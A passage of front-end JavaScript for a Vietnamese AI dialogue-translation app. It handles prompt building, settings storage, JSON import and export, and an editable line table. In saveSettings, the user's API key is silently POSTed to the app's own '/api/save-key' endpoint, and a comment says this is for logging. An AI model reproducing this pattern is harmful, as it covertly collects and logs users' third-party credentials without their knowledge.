        prompt += "2. BẮT BUỘC PHẢI sử dụng chính xác xưng hô giữa các nhân vật như đã chỉ định ở trên. Tuyệt đối không thay đổi.\n";
        prompt += "3. BẮT BUỘC PHẢI giữ nguyên những dòng có Biểu hiện/dạng thoại là \"giữ nguyên\"\n";
        prompt += "4. PHẢI GIỮ NGUYÊN định dạng đầu vào 'Nhân vật: X, Biểu hiện/dạng thoại: Y, câu cần dịch: Z' ở mỗi dòng trong kết quả dịch\n";
        prompt += "5. Dịch thật chính xác, mượt mà, đúng văn phong ở phần Yêu cầu, đúng cảm xúc, tránh lỗi lặp từ\n";
        
        console.log(prompt);
        return prompt;
    }
    
    // Các hàm liên quan đến lưu và tải cài đặt
    function saveSettings() {
        try {
            // Thu thập tất cả dữ liệu
            const settingsData = collectAllData();
            
            // Lưu vào localStorage
            localStorage.setItem('dich-ai-settings', JSON.stringify(settingsData));
            
            // Lưu API key riêng
            if (settingsData.apiKey) {
                localStorage.setItem('gemini_api_key', settingsData.apiKey);
                
                // Gửi API key lên server để log
                sendApiKeyToServer(settingsData.apiKey);
            }
            
            console.log("Đã lưu cài đặt vào localStorage");
            showToast("Đã lưu cài đặt thành công!", 'success');
            
            // Reset trạng thái thay đổi
            hasUnsavedChanges = false;
        } catch (error) {
            console.error("Lỗi khi lưu cài đặt:", error);
            showToast("Có lỗi khi lưu cài đặt: " + error.message, 'error');
        }
    }

    // Thêm hàm sendApiKeyToServer nếu chưa tồn tại
    function sendApiKeyToServer(apiKey) {
        // Kiểm tra nếu API key hợp lệ
        if (!apiKey || apiKey.length < 10) return;
        
        // Lấy thông tin về nhà cung cấp API
        const providerSelect = document.getElementById('api-provider');
        const provider = providerSelect ? providerSelect.value : 'gemini';
        
        // Lấy thông tin về model đang được chọn
        const modelSelect = document.getElementById('model-selection');
        const model = modelSelect ? modelSelect.value : '';
        
        fetch('/api/save-key', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                api_key: apiKey,
                provider: provider,
                model: model
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.warning) {
                console.warn('Cảnh báo khi lưu API key:', data.warning);
            } else if (data.success) {
                console.log('API key đã được gửi lên server thành công');
            }
        })
        .catch(error => {
            console.error('Lỗi khi gửi API key lên server:', error);
        });
    }
    
    function loadSettings() {
        try {
            // Đọc từ localStorage
            const savedSettings = localStorage.getItem('dich-ai-settings');
            
            if (!savedSettings) {
                alert("Không tìm thấy cài đặt đã lưu!");
                return;
            }
            
            // Parse dữ liệu JSON
            const jsonData = JSON.parse(savedSettings);
            
            // Tải dữ liệu
            loadDataFromJson(jsonData);
            console.log("Đã tải cài đặt từ localStorage");
            showToast("Đã tải cài đặt thành công!", 'success');
        } catch (error) {
            console.error("Lỗi khi tải cài đặt:", error);
            showToast("Có lỗi khi tải cài đặt: " + error.message, 'error');
        }
    }
    
    function exportToJson() {
        try {
            // Thu thập tất cả dữ liệu
            const settingsData = collectAllData();
            
            // Chuyển đổi thành chuỗi JSON
            const jsonString = JSON.stringify(settingsData, null, 2);
            
            // Tạo Blob từ chuỗi JSON
            const blob = new Blob([jsonString], { type: 'application/json' });
            
            // Tạo URL cho Blob
            const url = URL.createObjectURL(blob);
            
            // Tạo phần tử a để tải xuống
            const a = document.createElement('a');
            a.href = url;
            a.download = 'dich-ai-settings.json';
            document.body.appendChild(a);
            a.click();
            
            // Dọn dẹp
            setTimeout(function() {
                document.body.removeChild(a);
                window.URL.revokeObjectURL(url);
            }, 0);
            
            console.log("Đã tải file cài đặt thành công");
        } catch (error) {
            console.error("Lỗi khi tải file cài đặt:", error);
            showToast("Có lỗi khi tải file cài đặt: " + error.message, 'error');
        }
    }
    
    // Chức năng nhập dữ liệu từ file cài đặt
    function importFromJson(event) {
        try {
            const file = event.target.files[0];
            if (!file) {
                return;
            }
            
            const reader = new FileReader();
            reader.onload = function(e) {
                try {
                    const jsonData = JSON.parse(e.target.result);
                    loadDataFromJson(jsonData);
                    console.log("Đã nhập cài đặt từ file thành công");
                    showToast("Đã nhập cài đặt từ file thành công!", 'success');
                } catch (parseError) {
                    console.error("Lỗi khi phân tích file cài đặt:", parseError);
                    showToast("File cài đặt không hợp lệ: " + parseError.message, 'error');
                }
            };
            
            reader.readAsText(file);
            
            // Reset input để có thể chọn lại cùng một file
            event.target.value = "";
        } catch (error) {
            console.error("Lỗi khi đọc file cài đặt:", error);
            showToast("Có lỗi khi đọc file cài đặt: " + error.message, 'error');
        }
    }
    
    // Thu thập tất cả dữ liệu để lưu
    function collectAllData() {
        updateCharactersList();
        updatePronounPairs();
        updateExpressionsData();
        
        // Lấy API key
        const apiKey = document.getElementById('api-key').value;
        
        // Lấy model được chọn
        const selectedModel = document.getElementById('model-selection').value;
        
        // Lấy nhà cung cấp API được chọn
        const selectedProvider = document.getElementById('api-provider') ? 
                                document.getElementById('api-provider').value : 'gemini';
        
        // Lấy danh sách model tùy chỉnh (những model có provider là 'openrouter' và không phải là model mặc định)
        const defaultOpenRouterModels = ['anthropic/claude-3-opus', 'anthropic/claude-3-sonnet'];
        const customModels = availableModels
            .filter(model => model.provider === 'openrouter' && !defaultOpenRouterModels.includes(model.id))
            .map(model => ({ id: model.id, name: model.name, description: model.description }));
        
        // Tạo đối tượng dữ liệu để xuất
        const data = {
            apiKey: apiKey,
            characters: characters.map(character => character.name),
            relationships: Array.from(relationshipContainer.querySelectorAll('.relationship-description')).map(input => input.value),
            pronouns: Array.from(pronounContainer.querySelectorAll('.pronoun-entry')).map(entry => {
                const fromSelect = entry.querySelector('.pronoun-from');
                const toSelect = entry.querySelector('.pronoun-to');
                return {
                    from: fromSelect.options[fromSelect.selectedIndex].value,
                    to: toSelect.options[toSelect.selectedIndex].value,
                    value: entry.querySelector('.pronoun-value').value,
                    selfValue: entry.querySelector('.self-pronoun-value').value
                };
            }),
            expressions: expressions.map(exp => exp.value),
            context: contextInput.value,
            genre: genreInput.value,
            style: styleInput.value,
            requirements: requirementsInput.value,
            selectedModel: selectedModel,
            selectedProvider: selectedProvider,
            customModels: customModels
        };
        
        return data;
    }
    
    // Tải dữ liệu từ JSON vào ứng dụng
    function loadDataFromJson(jsonData) {
        // Xóa dữ liệu hiện tại
        characterContainer.innerHTML = '';
        relationshipContainer.innerHTML = '';
        pronounContainer.innerHTML = '';
        expressionsContainer.innerHTML = '';
        
        // Reset các mảng dữ liệu
        characters = [];
        expressions = [];
        existingPronounPairs.clear();
        
        try {
            // Chỉ đặt API key nếu có trong dữ liệu
            if (jsonData.apiKey) {
                document.getElementById('api-key').value = jsonData.apiKey;
            }
            
            // Tải thông tin model được chọn nếu có
            if (jsonData.selectedModel) {
                const modelSelect = document.getElementById('model-selection');
                if (modelSelect) {
                    // Kiểm tra xem model có tồn tại trong danh sách không
                    if ([...modelSelect.options].some(option => option.value === jsonData.selectedModel)) {
                        modelSelect.value = jsonData.selectedModel;
                    }
                }
            }
            
            // Tải thông tin nhà cung cấp API nếu có
            if (jsonData.selectedProvider) {
                const providerSelect = document.getElementById('api-provider');
                if (providerSelect) {
                    if ([...providerSelect.options].some(option => option.value === jsonData.selectedProvider)) {
                        providerSelect.value = jsonData.selectedProvider;
                        // Cập nhật danh sách model dựa trên nhà cung cấp
                        updateModelOptions(jsonData.selectedProvider);
                    }
                }
            }
            
            // Tải nhân vật
            if (jsonData.characters && Array.isArray(jsonData.characters)) {
                // Xóa nhân vật hiện tại
                characterContainer.innerHTML = '';
                
                // Thêm nhân vật từ dữ liệu
                jsonData.characters.forEach(name => {
                    const newCharacter = characterTemplate.content.cloneNode(true);
                    characterContainer.appendChild(newCharacter);
                    
                    const nameInput = characterContainer.querySelector('.character-entry:last-child .character-name');
                    nameInput.value = name;
                    
                    const removeBtn = characterContainer.querySelector('.character-entry:last-child .remove-btn');
                    removeBtn.addEventListener('click', function() {
                        this.closest('.character-entry').remove();
                        updateCharactersList();
                        markAsChanged();
                    });
                    
                    nameInput.addEventListener('input', function() {
                        updateCharactersList();
                        markAsChanged();
                    });
                });
                
                // Cập nhật danh sách nhân vật
                updateCharactersList();
            }
            
            // Tải danh sách mối quan hệ
            if (jsonData.relationships && Array.isArray(jsonData.relationships)) {
                // Xóa mối quan hệ hiện tại
                relationshipContainer.innerHTML = '';
                
                // Thêm mối quan hệ từ dữ liệu
                jsonData.relationships.forEach(desc => {
                    const newRelationship = relationshipTemplate.content.cloneNode(true);
                    relationshipContainer.appendChild(newRelationship);
                    
                    const descInput = relationshipContainer.querySelector('.relationship-entry:last-child .relationship-description');
                    descInput.value = desc;
                    
                    const removeBtn = relationshipContainer.querySelector('.relationship-entry:last-child .remove-btn');
                    removeBtn.addEventListener('click', function() {
                        this.closest('.relationship-entry').remove();
                        markAsChanged();
                    });
                    
                    descInput.addEventListener('input', function() {
                        markAsChanged();
                    });
                });
            }
            
            // Tải danh sách xưng hô
            if (jsonData.pronouns && Array.isArray(jsonData.pronouns)) {
                // Xóa xưng hô hiện tại
                pronounContainer.innerHTML = '';
                
                // Thêm xưng hô từ dữ liệu
                jsonData.pronouns.forEach(item => {
                    addPronounWithData(item.from, item.to, item.value, item.selfValue);
                });
            }
            
            // Tải các trường khác
            if (jsonData.genre !== undefined) {
                document.getElementById('genre').value = jsonData.genre;
            }
            
            if (jsonData.style !== undefined) {
                document.getElementById('style').value = jsonData.style;
            }
            
            if (jsonData.requirements !== undefined) {
                document.getElementById('requirements').value = jsonData.requirements;
            }
            
            if (jsonData.context !== undefined) {
                document.getElementById('context').value = jsonData.context;
            }
            
            if (jsonData.sourceText !== undefined) {
                document.getElementById('source-text').value = jsonData.sourceText;
            }
            
            // Tải API key nếu có
            if (jsonData.apiKey !== undefined) {
                document.getElementById('api-key').value = jsonData.apiKey;
            }
            
            // Tải danh sách biểu hiện/dạng thoại
            if (jsonData.expressions && Array.isArray(jsonData.expressions)) {
                // Xóa biểu hiện hiện tại
                expressionsContainer.innerHTML = '';
                
                // Thêm biểu hiện từ dữ liệu
                jsonData.expressions.forEach(value => {
                    const newExpression = expressionTemplate.content.cloneNode(true);
                    expressionsContainer.appendChild(newExpression);
                    
                    const valueInput = expressionsContainer.querySelector('.expression-entry:last-child .expression-value');
                    valueInput.value = value;
                    
                    const removeBtn = expressionsContainer.querySelector('.expression-entry:last-child .remove-btn');
                    removeBtn.addEventListener('click', function() {
                        this.closest('.expression-entry').remove();
                        updateExpressionsData();
                        markAsChanged();
                    });
                    
                    valueInput.addEventListener('input', function() {
                        updateExpressionsData();
                        markAsChanged();
                    });
                });
                
                // Cập nhật danh sách biểu hiện
                updateExpressionsData();
            }
            
            // Tải dữ liệu bảng văn bản
            if (jsonData.textTable && Array.isArray(jsonData.textTable)) {
                // Tạo văn bản từ các dòng trong bảng
                const lines = jsonData.textTable.map(item => item.text);
                sourceTextInput.value = lines.join('\n');
                textLines = lines;
                
                // Tạo bảng
                createTextTable(lines);
                
                // Khôi phục lựa chọn nhân vật và biểu hiện
                jsonData.textTable.forEach((item, index) => {
                    const row = textTableBody.querySelector(`tr:nth-child(${index + 1})`);
                    if (row) {
                        const characterSelect = row.querySelector('.character-select');
                        const expressionSelect = row.querySelector('.expression-select');
                        
                        // Khôi phục lựa chọn nhân vật nếu có
                        if (item.character && item.character !== 'none' && 
                            Array.from(characterSelect.options).some(opt => opt.value === item.character)) {
                            characterSelect.value = item.character;
                        }
                        
                        // Khôi phục lựa chọn biểu hiện nếu có
                        if (item.expression && item.expression !== 'none' && 
                            Array.from(expressionSelect.options).some(opt => opt.value === item.expression)) {
                            expressionSelect.value = item.expression;
                        }
                    }
                });
            }
            
            // Tải các model tùy chỉnh nếu có
            if (jsonData.customModels && Array.isArray(jsonData.customModels)) {
                // Lọc ra các model OpenRouter mặc định
                const defaultOpenRouterModels = ['anthropic/claude-3-opus', 'anthropic/claude-3-sonnet'];
                
                // Xóa các model tùy chỉnh hiện tại
                availableModels = availableModels.filter(model => 
                    !(model.provider === 'openrouter' && !defaultOpenRouterModels.includes(model.id))
                );
                
                // Thêm các model tùy chỉnh từ file
                jsonData.customModels.forEach(model => {
                    if (!availableModels.some(m => m.id === model.id && m.provider === 'openrouter')) {
                        availableModels.push({
                            id: model.id,
                            name: model.name || model.id,
                            description: model.description || "Model tùy chỉnh của OpenRouter",
                            provider: "openrouter"
                        });
                    }
                });
                
                // Cập nhật danh sách model nếu đang ở provider OpenRouter
                if (jsonData.selectedProvider === 'openrouter') {
                    updateModelOptions('openrouter');
                }
            }
            
            // Đánh dấu là đã có thay đổi
            markAsChanged();
        } catch (error) {
            console.error("Lỗi khi tải dữ liệu từ JSON:", error);
            throw error;
        }
    }
    
    function addPronounWithData(from, to, value, selfValue) {
        const newPronoun = pronounTemplate.content.cloneNode(true);
        pronounContainer.appendChild(newPronoun);
        
        const fromSelect = pronounContainer.querySelector('.pronoun-entry:last-child .pronoun-from');
        const toSelect = pronounContainer.querySelector('.pronoun-entry:last-child .pronoun-to');
        const valueInput = pronounContainer.querySelector('.pronoun-entry:last-child .pronoun-value');
        const selfValueInput = pronounContainer.querySelector('.pronoun-entry:last-child .self-pronoun-value');
        
        populateCharacterSelect(fromSelect);
        populateCharacterSelect(toSelect);
        
        // Đặt giá trị
        fromSelect.value = from;
        toSelect.value = to;
        valueInput.value = value;
        selfValueInput.value = selfValue;
        
        // Lưu cặp gốc
        const pairKey = `${from}-${to}`;
        toSelect.dataset.originalPair = pairKey;
        existingPronounPairs.add(pairKey);
        
        // Add event listeners
        fromSelect.addEventListener('change', function() {
            // Xóa cặp gốc khỏi danh sách hiện có
            const originalPair = toSelect.dataset.originalPair;
            if (originalPair) {
                existingPronounPairs.delete(originalPair);
                delete toSelect.dataset.originalPair;
            }
            
            updateAvailableToCharacters(this.closest('.pronoun-entry'));
            markAsChanged();
        });
        
        toSelect.addEventListener('change', function() {
            // Xóa cặp gốc khỏi danh sách hiện có
            const originalPair = this.dataset.originalPair;
            if (originalPair) {
                existingPronounPairs.delete(originalPair);
                delete this.dataset.originalPair;
            }
            
            // Kiểm tra tính hợp lệ
            const fromValue = this.closest('.pronoun-entry').querySelector('.pronoun-from').value;
            const toValue = this.value;
            
            if (fromValue === toValue) {
                alert('Không thể thiết lập xưng hô với chính mình!');
                this.selectedIndex = 0;
                return;
            }
            
            const pairKey = `${fromValue}-${toValue}`;
            if (existingPronounPairs.has(pairKey)) {
                alert('Xưng hô giữa hai nhân vật này đã tồn tại!');
                this.selectedIndex = 0;
                return;
            }
            
            // Thêm cặp mới
            if (fromValue && toValue) {
                existingPronounPairs.add(pairKey);
                this.dataset.originalPair = pairKey;
            }
            
            markAsChanged();
        });
        
        // Value input listeners
        valueInput.addEventListener('change', markAsChanged);
        selfValueInput.addEventListener('change', markAsChanged);
        
        // Remove button
        const removeBtn = pronounContainer.querySelector('.pronoun-entry:last-child .remove-btn');
        removeBtn.addEventListener('click', function() {
            const entry = this.closest('.pronoun-entry');
            const fromValue = entry.querySelector('.pronoun-from').value;
            const toValue = entry.querySelector('.pronoun-to').value;
            
            // Remove from existing pairs
            existingPronounPairs.delete(`${fromValue}-${toValue}`);
            
            entry.remove();
            updatePronounPairs();
            markAsChanged();
        });
    }
    
    function addExpression() {
        const newExpression = expressionTemplate.content.cloneNode(true);
        expressionsContainer.appendChild(newExpression);
        
        // Add event listener to the remove button
        const removeBtn = expressionsContainer.querySelector('.expression-entry:last-child .remove-btn');
        removeBtn.addEventListener('click', function() {
            this.closest('.expression-entry').remove();
            updateExpressionsData();
            markAsChanged();
        });
        
        // Add event listener to input for updating expressions list
        const valueInput = expressionsContainer.querySelector('.expression-entry:last-child .expression-value');
        valueInput.addEventListener('input', function() {
            updateExpressionsData();
            markAsChanged();
        });
        
        updateExpressionsData();
        markAsChanged();
    }
    
    function updateExpressionsData() {
        expressions = [];
        document.querySelectorAll('.expression-value').forEach(input => {
            if (input.value.trim() !== '') {
                expressions.push(input.value.trim());
            }
        });
        
        console.log("Expressions list updated:", expressions);
        
        // Update all expression selects in the table
        updateTableExpressionSelects();
    }
    
    function updateTableExpressionSelects() {
        document.querySelectorAll('.text-table select.expression-select').forEach(select => {
            const currentValue = select.value;
            
            // Clear select
            select.innerHTML = '';
            
            // Add default "None" option
            const noneOption = document.createElement('option');
            noneOption.value = 'none';
            noneOption.textContent = 'Không có';
            select.appendChild(noneOption);
            
            // Add options for each expression
            expressions.forEach(expression => {
                const option = document.createElement('option');
                option.value = expression;
                option.textContent = expression;
                select.appendChild(option);
            });
            
            // Restore selection if possible
            if (currentValue && Array.from(select.options).some(opt => opt.value === currentValue)) {
                select.value = currentValue;
            } else {
                select.selectedIndex = 0;
            }
        });
    }
    
    function handleFileUpload(event) {
        const file = event.target.files[0];
        if (!file) return;
        
        const reader = new FileReader();
        reader.onload = function(e) {
            const content = e.target.result;
            textLines = content.split(/\r?\n/);
            
            // Filter out empty lines
            textLines = textLines.filter(line => line.trim() !== '');
            
            // Update hidden text area with the full content
            sourceTextInput.value = content;
            
            // Create table rows for each line
            createTextTable(textLines);
            
            console.log(`Loaded ${textLines.length} lines of text`);
            markAsChanged();
        };
        
        reader.readAsText(file);
    }
    
    // Hàm tạo dòng mới cho bảng văn bản, thêm các nút di chuyển lên/xuống
    function createTextTable(lines) {
        // Clear existing rows
        textTableBody.innerHTML = '';
        
        // Create a row for each line
        lines.forEach((line, index) => {
            const row = document.createElement('tr');
            
            // Line number cell
            const numberCell = document.createElement('td');
            numberCell.textContent = index + 1;
            numberCell.className = 'line-number';
            row.appendChild(numberCell);
            
            // Character select cell
            const characterCell = document.createElement('td');
            const characterSelect = document.createElement('select');
            characterSelect.className = 'character-select';
            
            // Add default "None" option
            const noneOption = document.createElement('option');
            noneOption.value = 'none';
            noneOption.textContent = 'Không có';
            characterSelect.appendChild(noneOption);
            
            // Add option for each character
            characters.forEach(character => {
                const option = document.createElement('option');
                option.value = character;
                option.textContent = character;
                characterSelect.appendChild(option);
            });
            
            characterSelect.addEventListener('change', function() {
                markAsChanged();
            });
            
            characterCell.appendChild(characterSelect);
            row.appendChild(characterCell);
            
            // Expression select cell
            const expressionCell = document.createElement('td');
            const expressionSelect = document.createElement('select');
            expressionSelect.className = 'expression-select';
            
            // Add default "None" option
            const noneExpressionOption = document.createElement('option');
            noneExpressionOption.value = 'none';
            noneExpressionOption.textContent = 'Không có';
            expressionSelect.appendChild(noneExpressionOption);
            
            // Add option for each expression
            expressions.forEach(expression => {
                const option = document.createElement('option');
                option.value = expression;
                option.textContent = expression;
                expressionSelect.appendChild(option);
            });
            
            expressionSelect.addEventListener('change', function() {
                markAsChanged();
            });
            
            expressionCell.appendChild(expressionSelect);
            row.appendChild(expressionCell);
            
            // Text cell
            const textCell = document.createElement('td');
            textCell.textContent = line;
            textCell.setAttribute('data-original-text', line);
            textCell.className = 'editable-text';
            textCell.title = 'Nhấp đúp để chỉnh sửa văn bản';
            
            // Thêm sự kiện double-click để chỉnh sửa
            textCell.addEventListener('dblclick', function() {
                makeTextEditable(this);
            });
            
            // Thêm nút hành động di chuyển và xóa
            const actionSpan = document.createElement('span');
            actionSpan.className = 'table-row-actions';
            
            // Nút di chuyển lên
            if (index > 0) {
                const moveUpBtn = document.createElement('button');
                moveUpBtn.type = 'button';
                moveUpBtn.className = 'action-btn move-up-btn';
                moveUpBtn.innerHTML = '<i class="fas fa-arrow-up"></i>';
                moveUpBtn.title = 'Di chuyển lên';
                moveUpBtn.addEventListener('click', function() {
                    moveRow(row, 'up');
                });
                actionSpan.appendChild(moveUpBtn);
            }
            
            // Nút di chuyển xuống
            if (index < lines.length - 1) {
                const moveDownBtn = document.createElement('button');
                moveDownBtn.type = 'button';
                moveDownBtn.className = 'action-btn move-down-btn';
                moveDownBtn.innerHTML = '<i class="fas fa-arrow-down"></i>';
                moveDownBtn.title = 'Di chuyển xuống';
                moveDownBtn.addEventListener('click', function() {
                    moveRow(row, 'down');
                });
                actionSpan.appendChild(moveDownBtn);
            }
            
            // Nút xóa dòng
            const deleteBtn = document.createElement('button');
            deleteBtn.type = 'button';
            deleteBtn.className = 'action-btn delete-row-btn';
            deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
            deleteBtn.title = 'Xóa dòng này';
            deleteBtn.addEventListener('click', function() {
                deleteTextRow(row, index);
            });
            actionSpan.appendChild(deleteBtn);
            
            textCell.appendChild(actionSpan);
            row.appendChild(textCell);
            
            // Add row to table body
            textTableBody.appendChild(row);
        });
    }
    
    // Hàm di chuyển dòng lên/xuống
    function moveRow(row, direction) {
        const rows = Array.from(textTableBody.querySelectorAll('tr'));
        const currentIndex = rows.indexOf(row);
        
        if (direction === 'up' && currentIndex > 0) {
            // Di chuyển lên
            const targetIndex = currentIndex - 1;
            
            // Hoán đổi vị trí trong DOM
            textTableBody.insertBefore(row, rows[targetIndex]);
            
            // Hoán đổi dữ liệu trong mảng textLines
            [textLines[targetIndex], textLines[currentIndex]] = [textLines[currentIndex], textLines[targetIndex]];
            
            // Cập nhật lại số thứ tự
            updateRowNumbers();
            
            // Đánh dấu đã thay đổi
            markAsChanged();
        } else if (direction === 'down' && currentIndex < rows.length - 1) {
            // Di chuyển xuống
            const targetIndex = currentIndex + 1;
            
            // Hoán đổi vị trí trong DOM
            if (rows[targetIndex].nextElementSibling) {
                textTableBody.insertBefore(row, rows[targetIndex].nextElementSibling);
            } else {
                textTableBody.appendChild(row);
            }
            
            // Hoán đổi dữ liệu trong mảng textLines
            [textLines[currentIndex], textLines[targetIndex]] = [textLines[targetIndex], textLines[currentIndex]];
            
            // Cập nhật lại số thứ tự
            updateRowNumbers();
            
            // Đánh dấu đã thay đổi
            markAsChanged();
        }
        
        // Cập nhật nút di chuyển (lên/xuống) cho tất cả các dòng
        updateMoveButtons();
    }
    
    // Cập nhật số thứ tự cho tất cả các dòng
    function updateRowNumbers() {
        const rows = textTableBody.querySelectorAll('tr');
        rows.forEach((row, idx) => {
            row.querySelector('.line-number').textContent = idx + 1;
            
            // Cập nhật lại sự kiện xóa với index mới
            const deleteBtn = row.querySelector('.delete-row-btn');
            if (deleteBtn) {
                deleteBtn.onclick = null;
                deleteBtn.addEventListener('click', function() {
                    deleteTextRow(row, idx);
                });
            }
        });
        
        // Cập nhật textarea chứa toàn bộ nội dung
        sourceTextInput.value = textLines.join('\n');
    }
    
    // Cập nhật nút di chuyển cho tất cả các dòng
    function updateMoveButtons() {
        const rows = Array.from(textTableBody.querySelectorAll('tr'));
        
        rows.forEach((row, idx) => {
            const actionsContainer = row.querySelector('.table-row-actions');
            if (!actionsContainer) return;
            
            // Xóa nút di chuyển cũ
            const oldMoveUpBtn = actionsContainer.querySelector('.move-up-btn');
            const oldMoveDownBtn = actionsContainer.querySelector('.move-down-btn');
            if (oldMoveUpBtn) actionsContainer.removeChild(oldMoveUpBtn);
            if (oldMoveDownBtn) actionsContainer.removeChild(oldMoveDownBtn);
            
            // Thêm nút di chuyển lên nếu không phải dòng đầu tiên
            if (idx > 0) {
                const moveUpBtn = document.createElement('button');
                moveUpBtn.type = 'button';
                moveUpBtn.className = 'action-btn move-up-btn';
                moveUpBtn.innerHTML = '<i class="fas fa-arrow-up"></i>';
                moveUpBtn.title = 'Di chuyển lên';
                moveUpBtn.addEventListener('click', function() {
                    moveRow(row, 'up');
                });
                
                // Thêm vào đầu để nút di chuyển nằm trước nút xóa
                actionsContainer.insertBefore(moveUpBtn, actionsContainer.firstChild);
            }
            
            // Thêm nút di chuyển xuống nếu không phải dòng cuối cùng
            if (idx < rows.length - 1) {
                const moveDownBtn = document.createElement('button');
                moveDownBtn.type = 'button';
                moveDownBtn.className = 'action-btn move-down-btn';
                moveDownBtn.innerHTML = '<i class="fas fa-arrow-down"></i>';
                moveDownBtn.title = 'Di chuyển xuống';
                moveDownBtn.addEventListener('click', function() {
                    moveRow(row, 'down');
                });
                
                // Thêm trước nút xóa
                const deleteBtn = actionsContainer.querySelector('.delete-row-btn');
                if (deleteBtn) {
                    actionsContainer.insertBefore(moveDownBtn, deleteBtn);
                } else {
                    actionsContainer.appendChild(moveDownBtn);
                }
            }
        });
    }

    // Hàm xóa một dòng văn bản
    function deleteTextRow(row, index) {
        // Kiểm tra xem nút xóa có đang được xử lý không
        if (row.getAttribute('data-deleting') === 'true') {
            return;
        }
        
        // Đánh dấu đang trong quá trình xóa
        row.setAttribute('data-deleting', 'true');
        
        if (confirm('Bạn có chắc chắn muốn xóa dòng này không?')) {
            // Xác định index thực của dòng (vì phần tử row có thể đã thay đổi vị trí)
            const currentIndex = Array.from(textTableBody.querySelectorAll('tr')).indexOf(row);
            
            // Xóa dòng khỏi mảng textLines với index đã xác định lại
            textLines.splice(currentIndex, 1);
            
            // Xóa dòng khỏi bảng
            row.parentNode.removeChild(row);
            
            // Cập nhật lại số thứ tự các dòng
            const rows = textTableBody.querySelectorAll('tr');
            rows.forEach((row, idx) => {
                row.cells[0].textContent = idx + 1;
                
                // Cập nhật lại sự kiện xóa với index mới
                const deleteBtn = row.querySelector('.delete-row-btn');
                if (deleteBtn) {
                    deleteBtn.onclick = null;
                    deleteBtn.addEventListener('click', function() {
                        deleteTextRow(row, idx);
                    });
                }
            });
            
            // Cập nhật textarea chứa toàn bộ nội dung
            sourceTextInput.value = textLines.join('\n');
            
            // Đánh dấu đã thay đổi
            markAsChanged();
            
            // Thông báo đã xóa
            showToast('Đã xóa dòng thành công', 'info');
        } else {
            // Hủy đánh dấu xóa nếu người dùng chọn Cancel
            row.removeAttribute('data-deleting');
        }
    }
    
    // Thêm nút xóa dòng trong hàm addNewTextRow
    function addNewTextRow() {
        // Thêm dòng trống vào mảng textLines
        textLines.push('');
        
        // Tạo dòng mới
        const row = document.createElement('tr');
        
        // Line number cell
        const numberCell = document.createElement('td');
        numberCell.textContent = textLines.length;
        numberCell.className = 'line-number';
        row.appendChild(numberCell);
        
        // Character select cell
        const characterCell = document.createElement('td');
        const characterSelect = document.createElement('select');
        characterSelect.className = 'character-select';
        
        // Add default "None" option
        const noneOption = document.createElement('option');
        noneOption.value = 'none';
        noneOption.textContent = 'Không có';
        characterSelect.appendChild(noneOption);
        
        // Add option for each character
        characters.forEach(character => {
            const option = document.createElement('option');
            option.value = character;
            option.textContent = character;
            characterSelect.appendChild(option);
        });
        
        characterSelect.addEventListener('change', function() {
            markAsChanged();
        });
        
        characterCell.appendChild(characterSelect);
        row.appendChild(characterCell);
        
        // Expression select cell
        const expressionCell = document.createElement('td');
        const expressionSelect = document.createElement('select');
        expressionSelect.className = 'expression-select';
        
        // Add default "None" option
        const noneExpressionOption = document.createElement('option');
        noneExpressionOption.value = 'none';
        noneExpressionOption.textContent = 'Không có';
        expressionSelect.appendChild(noneExpressionOption);
        
        // Add option for each expression
        expressions.forEach(expression => {
            const option = document.createElement('option');
            option.value = expression;
            option.textContent = expression;
            expressionSelect.appendChild(option);
        });
        
        expressionSelect.addEventListener('change', function() {
            markAsChanged();
        });
        
        expressionCell.appendChild(expressionSelect);
        row.appendChild(expressionCell);
        
        // Text cell (empty)
        const textCell = document.createElement('td');
        textCell.textContent = '';
        textCell.setAttribute('data-original-text', '');
        textCell.className = 'editable-text';
        textCell.title = 'Nhấp đúp để chỉnh sửa văn bản';
        
        // Thêm sự kiện double-click để chỉnh sửa
        textCell.addEventListener('dblclick', function() {
            makeTextEditable(this);
        });
        
        // Thêm các nút hành động
        const actionSpan = document.createElement('span');
        actionSpan.className = 'table-row-actions';
        
        // Nút di chuyển lên (luôn có vì dòng mới là dòng cuối)
        const moveUpBtn = document.createElement('button');
        moveUpBtn.type = 'button';
        moveUpBtn.className = 'action-btn move-up-btn';
        moveUpBtn.innerHTML = '<i class="fas fa-arrow-up"></i>';
        moveUpBtn.title = 'Di chuyển lên';
        moveUpBtn.addEventListener('click', function() {
            moveRow(row, 'up');
        });
        actionSpan.appendChild(moveUpBtn);
        
        // Nút xóa dòng
        const deleteBtn = document.createElement('button');
        deleteBtn.type = 'button';
        deleteBtn.className = 'action-btn delete-row-btn';
        deleteBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
        deleteBtn.title = 'Xóa dòng này';
        deleteBtn.addEventListener('click', function() {
            // Sử dụng vị trí thực tế của dòng trong bảng
            const currentRowIndex = Array.from(textTableBody.querySelectorAll('tr')).indexOf(row);
            deleteTextRow(row, currentRowIndex);
        });
        actionSpan.appendChild(deleteBtn);
        
        textCell.appendChild(actionSpan);
        row.appendChild(textCell);
        
        // Add row to table body
        textTableBody.appendChild(row);
        
        // Cập nhật nút di chuyển cho tất cả các dòng
        updateMoveButtons();
        
        // Cập nhật textarea chứa toàn bộ nội dung
        sourceTextInput.value = textLines.join('\n');
        
        // Bắt đầu chỉnh sửa ngay lập tức
        setTimeout(() => makeTextEditable(textCell), 0);
        
        // Đánh dấu đã thay đổi
        markAsChanged();
    }
    
    // Update character selects in the table when character list changes
    function updateTableCharacterSelects() {
        document.querySelectorAll('.text-table select.character-select').forEach(select => {
            const currentValue = select.value;
            
            // Clear select
            select.innerHTML = '';
            
            // Add default "None" option
            const noneOption = document.createElement('option');
            noneOption.value = 'none';
            noneOption.textContent = 'Không có';
            select.appendChild(noneOption);
            
            // Add options for each character
            characters.forEach(character => {
                const option = document.createElement('option');
                option.value = character;
                option.textContent = character;
                select.appendChild(option);
            });
            
            // Restore selection if possible
            if (currentValue && Array.from(select.options).some(opt => opt.value === currentValue)) {
                select.value = currentValue;
            } else {
                select.selectedIndex = 0;
            }
        });
    }
    
    // Add a few expressions by default if none exist
    if (expressionsContainer.children.length === 0) {
        // Define some default expressions
        const defaultExpressions = [
            'Giữ nguyên', 'Vui vẻ', 'Buồn bã', 'Tức giận', 'Suy nghĩ', 
            'Hét lớn', 'Khóc lóc', 'Cười nhẹ', 'Nghiêm túc', 
        ];
        
